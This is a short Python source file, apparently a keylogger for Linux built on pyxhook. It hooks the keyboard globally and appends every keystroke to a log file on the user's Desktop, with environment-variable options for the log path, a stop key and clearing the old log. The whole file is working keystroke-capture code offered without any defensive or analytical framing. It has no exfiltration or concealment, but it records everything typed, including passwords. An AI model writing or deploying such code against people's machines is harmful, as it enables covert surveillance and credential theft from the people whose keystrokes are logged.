# Import necessary libraries
import os
import pyxhook

# Define the log file path either from the environment variable or default to desktop
log_file = os.environ.get(
    'pylogger_file',
    os.path.expanduser('~/Desktop/file.log')
)

# Define the key to cancel logging, defaulting to '`' if not specified
cancel_key = ord(
    os.environ.get(
        'pylogger_cancel',
        '`'
    )[0]
)

# If specified, clean the log file
if os.environ.get('pylogger_clean', None) is not None:
    try:
        os.remove(log_file)
    except EnvironmentError:
        pass

# Function to handle key press events and log them to the file
def OnKeyPress(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.Key))

# Create a new hook manager instance
new_hook = pyxhook.HookManager()

# Assign the OnKeyPress function to handle KeyDown events
new_hook.KeyDown = OnKeyPress

# Hook the keyboard
new_hook.HookKeyboard()

try:
    # Start capturing keyboard events
    new_hook.start()
except Exception as ex:
    # Handle exceptions
    msg = 'Error while catching events:\n {}'.format(ex)
    pyxhook.print_err(msg)
    with open(log_file, 'a') as f:
        f.write('\n{}'.format(msg))

